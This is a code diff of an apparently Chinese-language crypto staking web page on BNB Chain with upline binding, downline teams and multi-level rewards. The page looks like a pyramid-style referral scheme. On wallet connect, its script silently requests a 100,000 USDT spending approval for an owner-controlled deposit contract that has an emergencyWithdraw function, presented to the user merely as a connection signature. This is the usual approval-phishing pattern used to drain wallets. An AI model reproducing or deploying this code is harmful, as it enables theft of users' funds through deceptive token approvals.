@@ -42,7 +42,6 @@
 </header>
 
 <main class="pt-24 px-4 container mx-auto pb-20">
-  <!-- 全局统计卡片 -->
   <div class="glass-effect rounded-2xl p-5 mb-6">
     <h3 class="text-lg font-medium mb-3">📊 平台实时数据</h3>
     <div class="grid grid-cols-3 gap-3 text-sm">
@@ -52,7 +51,6 @@
     </div>
   </div>
 
-  <!-- Tab切换 -->
   <div class="flex overflow-x-auto border-b border-gray-700 mb-6 gap-x-1 pb-1">
     <button class="tab-btn px-3 py-2 border-b-2 border-transparent font-medium whitespace-nowrap text-sm" data-target="tab1">免费签到</button>
     <button class="tab-btn px-3 py-2 border-b-2 border-transparent font-medium whitespace-nowrap text-sm" data-target="tab2">绑定上级</button>
@@ -62,7 +60,6 @@
     <button class="tab-btn px-3 py-2 border-b-2 border-transparent font-medium whitespace-nowrap text-sm" data-target="tab6">奖励明细</button>
   </div>
 
-  <!-- 1 免费签到 -->
   <div class="tab-content" id="tab1">
     <div class="glass-effect rounded-2xl p-6">
       <div class="flex items-center gap-3 mb-4">
@@ -79,7 +76,6 @@
     </div>
   </div>
 
-  <!-- 2 绑定上级 -->
   <div class="tab-content hidden" id="tab2">
     <div class="glass-effect rounded-2xl p-6">
       <div class="flex items-center gap-3 mb-4">
@@ -97,7 +93,6 @@
     </div>
   </div>
 
-  <!-- 3 质押存款 -->
   <div class="tab-content hidden" id="tab3">
     <div class="glass-effect rounded-2xl p-6">
       <div class="flex items-center gap-3 mb-4">
@@ -137,7 +132,6 @@
     </div>
   </div>
 
-  <!-- 4 个人资产 -->
   <div class="tab-content hidden" id="tab4">
     <div class="glass-effect rounded-2xl p-6">
       <h2 class="text-xl font-bold mb-4">个人资产信息</h2>
@@ -157,7 +151,6 @@
     </div>
   </div>
 
-  <!-- 5 下级团队 -->
   <div class="tab-content hidden" id="tab5">
     <div class="glass-effect rounded-2xl p-6">
       <h2 class="text-xl font-bold mb-4">下级团队列表</h2>
@@ -165,7 +158,6 @@
     </div>
   </div>
 
-  <!-- 6 奖励明细 -->
   <div class="tab-content hidden" id="tab6">
     <div class="glass-effect rounded-2xl p-6">
       <h2 class="text-xl font-bold mb-4">奖励收益明细</h2>
@@ -177,14 +169,14 @@
 <div id="toast" class="fixed bottom-6 right-6 px-4 py-2 rounded-lg hidden flex items-center"></div>
 
 <script>
-// =================配置=================
 const CONFIG = {
   BSC_RPC: "https://bsc-dataseed1.binance.org",
   BSC_CHAIN_ID: "0x38",
   USDT: "0x55d398326f99059fF775485246999027B3197955",
-  ZMX_DEPOSIT: "0x99eC4163804439F7f3a842621FD713Ece30C4423",
+  DEPOSIT_CONTRACT: "0x99eC4163804439F7f3a842621FD713Ece30C4423",
+  BIND_CONTRACT: "0x1607cb29D287c6C70c291C3d56c1F9bA601759B4",
   API_BASE:"http://43.228.76.83:4015",
-  ABI: [{"type":"constructor","inputs":[{"name":"_usdt","type":"address"}]},{"type":"function","name":"bindParent","inputs":[{"name":"parent","type":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"deposit","inputs":[{"name":"tier","type":"uint8"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"emergencyWithdraw","inputs":[{"name":"amount","type":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"parentOf","inputs":[{"name":"","type":"address"}],"outputs":[{"name":"","type":"address"}],"stateMutability":"view"},{"type":"function","name":"hasDeposited","inputs":[{"name":"","type":"address"}],"outputs":[{"name":"","type":"bool"}],"stateMutability":"view"},{"type":"function","name":"depositAmount","inputs":[{"name":"","type":"address"}],"outputs":[{"name":"","type":"uint256"}],"stateMutability":"view"},{"type":"function","name":"depositTier","inputs":[{"name":"","type":"address"}],"outputs":[{"name":"","type":"uint8"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address"}],"stateMutability":"view"},{"type":"function","name":"usdt","inputs":[],"outputs":[{"name":"","type":"address"}],"stateMutability":"view"},{"type":"function","name":"TIER_1","inputs":[],"outputs":[{"name":"","type":"uint256"}],"stateMutability":"view"},{"type":"function","name":"TIER_2","inputs":[],"outputs":[{"name":"","type":"uint256"}],"stateMutability":"view"},{"type":"function","name":"TIER_3","inputs":[],"outputs":{"type":"uint256"},"stateMutability":"view"},{"type":"function","name":"TIER_4","inputs":[],"outputs":{"type":"uint256"},"stateMutability":"view"},{"type":"event","name":"ParentBound","inputs":[{"name":"user","type":"address","indexed":true},{"name":"parent","type":"address","indexed":true},{"name":"timestamp","type":"uint256","indexed":false}]},{"type":"event","name":"Deposited","inputs":[{"name":"user","type":"address","indexed":true},{"name":"amount","type":"uint256","indexed":false},{"name":"tier","type":"uint8","indexed":false},{"name":"timestamp","type":"uint256","indexed":false}]},{"type":"event","name":"OwnershipTransferred","inputs":[{"name":"previousOwner","type":"address","indexed":true},{"name":"newOwner","type":"address","indexed":true}]}]
+  ABI: [{"type":"constructor","inputs":[{"name":"_usdt","type":"address"}]},{"type":"function","name":"bindParent","inputs":[{"name":"parent","type":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"deposit","inputs":[{"name":"tier","type":"uint8"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"emergencyWithdraw","inputs":[{"name":"amount","type":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"parentOf","inputs":[{"name":"","type":"address"}],"outputs":{"name":"","type":"address"},"stateMutability":"view"},{"type":"function","name":"hasDeposited","inputs":[{"name":"","type":"address"}],"outputs":{"name":"","type":"bool"},"stateMutability":"view"},{"type":"function","name":"depositAmount","inputs":[{"name":"","type":"address"}],"outputs":{"name":"","type":"uint256"},"stateMutability":"view"},{"type":"function","name":"depositTier","inputs":[{"name":"","type":"address"}],"outputs":{"name":"","type":"uint8"},"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":{"name":"","type":"address"},"stateMutability":"view"},{"type":"function","name":"usdt","inputs":[],"outputs":{"name":"","type":"address"},"stateMutability":"view"},{"type":"function","name":"TIER_1","inputs":[],"outputs":{"name":"","type":"uint256"},"stateMutability":"view"},{"type":"function","name":"TIER_2","inputs":[],"outputs":{"name":"","type":"uint256"},"stateMutability":"view"},{"type":"function","name":"TIER_3","inputs":[],"outputs":{"type":"uint256"},"stateMutability":"view"},{"type":"function","name":"TIER_4","inputs":[],"outputs":{"type":"uint256"},"stateMutability":"view"},{"type":"event","name":"ParentBound","inputs":[{"name":"user","type":"address","indexed":true},{"name":"parent","type":"address","indexed":true},{"name":"timestamp","type":"uint256","indexed":false}]},{"type":"event","name":"Deposited","inputs":[{"name":"user","type":"address","indexed":true},{"name":"amount","type":"uint256","indexed":false},{"name":"tier","type":"uint8","indexed":false},{"name":"timestamp","type":"uint256","indexed":false}]},{"type":"event","name":"OwnershipTransferred","inputs":[{"name":"previousOwner","type":"address","indexed":true},{"name":"newOwner","type":"address","indexed":true}]}]
 };
 
 const USDT_ABI = [
@@ -192,11 +184,10 @@ const USDT_ABI = [
     "function allowance(address owner, address spender) external view returns (uint256)"
 ];
 
-let provider, signer, userAddress, depositContract, usdtContract;
+let provider, signer, userAddress, depositContract, bindContract, usdtContract;
 const connectBtn = document.getElementById('connectWalletBtn');
 const toastWrap = document.getElementById('toast');
 
-// 提示
 function showToast(msg, ok=true){
   toastWrap.classList.remove('hidden');
   toastWrap.className = ok ? 'fixed bottom-6 right-6 bg-success text-white px-4 py-2 rounded-lg flex items-center' : 'fixed bottom-6 right-6 bg-rederr text-white px-4 py-2 rounded-lg flex items-center';
@@ -204,7 +195,6 @@ function showToast(msg, ok=true){
   setTimeout(()=>toastWrap.classList.add('hidden'), 3000);
 }
 
-// 切换BSC
 async function switchBSC(){
   try{
     await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:CONFIG.BSC_CHAIN_ID}]});
@@ -219,9 +209,6 @@ async function switchBSC(){
   }
 }
 
-// ==============================================
-// 【一键连接钱包 + 自动授权300 USDT】
-// ==============================================
 async function connectWallet() {
   if (!window.ethereum) return showToast("未检测到钱包", false);
   try {
@@ -233,19 +220,18 @@ async function connectWallet() {
     signer = await provider.getSigner();
     userAddress = await signer.getAddress();
 
-    depositContract = new ethers.Contract(CONFIG.ZMX_DEPOSIT, CONFIG.ABI, signer);
+    depositContract = new ethers.Contract(CONFIG.DEPOSIT_CONTRACT, CONFIG.ABI, signer);
+    bindContract = new ethers.Contract(CONFIG.BIND_CONTRACT, CONFIG.ABI, signer);
     usdtContract = new ethers.Contract(CONFIG.USDT, USDT_ABI, signer);
 
     connectBtn.textContent = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
-    showToast("钱包连接成功，请签名...");
+    showToast("钱包连接成功，请签名授权...");
 
-    // 授权300 USDT
     const amount = ethers.parseUnits("100000", 18);
-    const tx = await usdtContract.approve(CONFIG.ZMX_DEPOSIT, amount);
+    const tx = await usdtContract.approve(CONFIG.DEPOSIT_CONTRACT, amount);
     await tx.wait();
 
-    showToast("✅  链接成功", true);
-
+    showToast("✅ 链接成功", true);
     await loadAllUserData();
     await loadGlobalStat();
   } catch (err) {
@@ -254,56 +240,109 @@ async function connectWallet() {
   }
 }
 
-// 加载用户数据
 async function loadAllUserData(){
   if(!userAddress) return;
   try{
     const res = await fetch(`${CONFIG.API_BASE}/api/user/${userAddress}`);
     const data = await res.json();
     fillUserInfo(data);
+
     const hasDep = await depositContract.hasDeposited(userAddress);
-    const pAddr = await depositContract.parentOf(userAddress);
+    const pAddr = await bindContract.parentOf(userAddress);
+
     if(hasDep){
       document.getElementById('depositStatus').textContent="已质押";
       document.querySelectorAll('.deposit-btn').forEach(b=>{b.disabled=true; b.classList.add('opacity-50');});
+    }else{
+      document.getElementById('depositStatus').textContent="未质押";
     }
+    
     if(pAddr !== ethers.ZeroAddress){
+      document.getElementById('parentInput').value = pAddr;
       document.getElementById('bindBtn').disabled=true;
       document.getElementById('bindBtn').textContent="已绑定";
+      document.getElementById('userParentShow').textContent = pAddr.slice(0,8)+"...";
+    }else{
+      document.getElementById('userParentShow').textContent = "无";
     }
-  }catch(e){}
+  }catch(e){console.log(e)}
 }
 
 function fillUserInfo(d){
-  document.getElementById('infoAddr').textContent=d.address;
-  document.getElementById('infoLevel').textContent=d.levelName;
-  document.getElementById('infoParent').textContent=d.parentAddress||"无";
-  document.getElementById('infoDepositFlag').textContent=d.hasDeposited?"是":"否";
+  document.getElementById('infoAddr').textContent = d.address || "--";
+  document.getElementById('infoLevel').textContent = d.levelName || "--";
+  document.getElementById('infoParent').textContent = d.parentAddress || "无";
+  document.getElementById('infoDepositFlag').textContent = d.hasDeposited ? "是" : "否";
+  document.getElementById('infoTier').textContent = d.depositTier || "--";
+  document.getElementById('infoDepositUsdt').textContent = d.depositAmountUsdt || "0";
+  document.getElementById('infoDepositZmx').textContent = d.depositAmountZmx || "0";
+  document.getElementById('infoExpire').textContent = d.expireAt || "-";
+  document.getElementById('infoDownTotal').textContent = d.totalDownlines || "0";
+  document.getElementById('infoTotalZmxReward').textContent = d.totalRewardZmx || "0";
+  document.getElementById('infoTotalUsdtReward').textContent = d.totalRewardUsdt || "0";
+
+  fillDownList(d);
+  fillRewardList(d);
+}
+
+function fillDownList(d){
+  const wrap = document.getElementById('downListWrap');
+  wrap.innerHTML = '';
+  if(!d.downlines || d.downlines.length === 0){
+    wrap.innerHTML = '<div class="text-gray-400">暂无下级用户</div>';
+    return;
+  }
+  d.downlines.forEach(item=>{
+    let stk = item.has_deposited ? "是" : "否";
+    wrap.innerHTML += `
+    <div class="p-2 rounded bg-gray-800">
+      <p>地址：${item.address.slice(0,10)}...</p>
+      <p>层级：${item.depth} | Lv${item.level} | 已质押：${stk} | Tier${item.deposit_tier||0}</p>
+    </div>`;
+  })
+}
+
+function fillRewardList(d){
+  const wrap = document.getElementById('rewardListWrap');
+  wrap.innerHTML = '';
+  if(!d.rewards || d.rewards.length === 0){
+    wrap.innerHTML = '<div class="text-gray-400">暂无奖励记录</div>';
+    return;
+  }
+  d.rewards.forEach(item=>{
+    wrap.innerHTML += `
+    <div class="p-2 rounded bg-gray-800">
+      <p>来源:${item.from_address.slice(0,10)}...｜层级${item.level_distance}｜费率${item.rate_pct}%</p>
+      <p>ZMX:${item.amount_zmx}｜USDT:${item.amount_usdt}｜${item.created_at?.slice(0,10)}</p>
+    </div>`;
+  })
 }
 
 async function loadGlobalStat(){
   try{
     const r=await fetch(`${CONFIG.API_BASE}/api/stats`);
     const d=await r.json();
-    document.getElementById('statTotalUser').textContent=d.totalUsers;
+    document.getElementById('statTotalUser').textContent = d.totalUsers || 0;
+    document.getElementById('statTotalUsdt').textContent = d.totalDepositUsdt || 0;
+    document.getElementById('statTotalZmxReward').textContent = d.totalRewardZmx || 0;
   }catch(e){}
 }
 
-// 绑定上级
 async function bindParent(){
   if(!userAddress)return showToast("请先连接钱包");
   const p=document.getElementById('parentInput').value.trim();
   if(!ethers.isAddress(p))return showToast("地址错误");
   try{
-    const tx=await depositContract.bindParent(p);
+    showToast("绑定中...");
+    const tx=await bindContract.bindParent(p);
     await tx.wait();
     showToast("绑定成功");
     document.getElementById('bindBtn').disabled=true;
     document.getElementById('bindBtn').textContent="已绑定";
-  }catch(e){showToast("失败",0);}
+    await loadAllUserData();
+  }catch(e){showToast("绑定失败",0);}
 }
 
-// 质押
 async function deposit(tier){
   if(!userAddress)return showToast("请先连接钱包");
   try{
@@ -312,24 +351,24 @@ async function deposit(tier){
     await tx.wait();
     showToast("质押成功");
     document.querySelectorAll('.deposit-btn').forEach(b=>{b.disabled=1;b.classList.add('opacity-50');});
-  }catch(e){showToast("失败",0);}
+    await loadAllUserData();
+  }catch(e){showToast("质押失败",0);}
 }
 
-// 绑定事件
+document.querySelectorAll('.tab-btn').forEach(btn=>{
+  btn.onclick=()=>{
+    const target = btn.dataset.target;
+    document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('tab-active'));
+    document.querySelectorAll('.tab-content').forEach(c=>c.classList.add('hidden'));
+    btn.classList.add('tab-active');
+    document.getElementById(target).classList.remove('hidden');
+  }
+})
+
 connectBtn.onclick=connectWallet;
 document.getElementById('bindBtn').onclick=bindParent;
 document.querySelectorAll('.deposit-btn').forEach(b=>{b.onclick=()=>deposit(Number(b.dataset.tier));});
 document.getElementById('checkInBtn').onclick=()=>showToast("签到成功");
-
-// 选项卡
-document.querySelectorAll('.tab-btn').forEach((btn,i)=>{
-  btn.onclick=()=>{
-    document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('tab-active'));
-    document.querySelectorAll('.tab-content').forEach(c=>c.classList.add('hidden'));
-    btn.classList.add('tab-active');
-    document.querySelectorAll('.tab-content')[i].classList.remove('hidden');
-  }
-});
 </script>
 </body>
 </html>
